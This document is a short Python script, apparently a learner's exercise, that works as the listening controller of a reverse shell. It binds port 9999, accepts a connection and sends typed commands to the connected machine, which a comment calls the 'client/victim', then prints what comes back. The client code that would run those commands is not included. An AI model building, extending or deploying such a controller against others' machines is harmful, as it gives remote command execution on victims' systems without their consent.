import socket
import sys #import command line


#create a socket(connect two computer)
def create_socket():
    try:
        global host
        global port
        global s#socket
        host=""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket exception error:"+str(msg))


#binding the socket and listenning for connexion
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port " + str(port))
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket bindin Error  " + str(msg) + ".Retrying...")
        bind_socket()


#establish the connection with the client (socket must be listenning)
def socket_accept():
    conn,adress=s.accept()
    print("Connexion has been establish |"+" IP "+ adress[0] + "| PORT " + str(adress[1]))
    send_command(conn)
    conn.close()

#send commad to the client/victim or a friend
def send_command(conn):
    while True:
        cmd = input()
        if ( cmd == "quit"):
            conn.close()
            s.close()
            sys.exit()
        if (len(str.encode(cmd)) > 0):
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

#calling all socket function
def main():
    create_socket()
    bind_socket()
    socket_accept()



main()



